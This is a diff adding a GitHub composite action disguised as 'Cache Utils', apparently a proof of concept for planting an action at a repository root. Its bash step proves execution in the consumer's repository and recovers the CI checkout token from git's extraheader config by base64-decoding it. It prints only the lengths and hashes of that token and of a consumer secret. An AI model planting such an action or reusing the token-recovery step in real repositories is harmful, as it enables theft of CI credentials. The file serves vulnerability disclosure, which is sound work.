@@ -1,0 +1,24 @@
+name: 'Cache Utils'
+description: 'PoC composite action planted at the repository ROOT (no .github/ path involved)'
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: |
+        echo "ACTION_YML_EXECUTED=yes"
+        echo "running_inside_repo=$GITHUB_REPOSITORY"
+        echo "workflow=$GITHUB_WORKFLOW  job=$GITHUB_JOB"
+        # possession proofs -- print DERIVATIONS, never the plaintext
+        if [ -n "$CONSUMER_SECRET" ]; then
+          echo "consumer_secret_len=${#CONSUMER_SECRET}"
+          echo "consumer_secret_sha256=$(printf '%s' "$CONSUMER_SECRET" | sha256sum | cut -d' ' -f1)"
+        else
+          echo "consumer_secret_len=0"
+        fi
+        HDR=$(git config --get http.https://github.com/.extraheader || true)
+        if [ -n "$HDR" ]; then
+          TOK=$(printf '%s' "$HDR" | awk '{print $NF}' | base64 -d 2>/dev/null | cut -d: -f2)
+          echo "checkout_token_recovered=yes len=${#TOK} sha256=$(printf '%s' "$TOK" | sha256sum | cut -d' ' -f1)"
+        else
+          echo "checkout_token_recovered=no"
+        fi
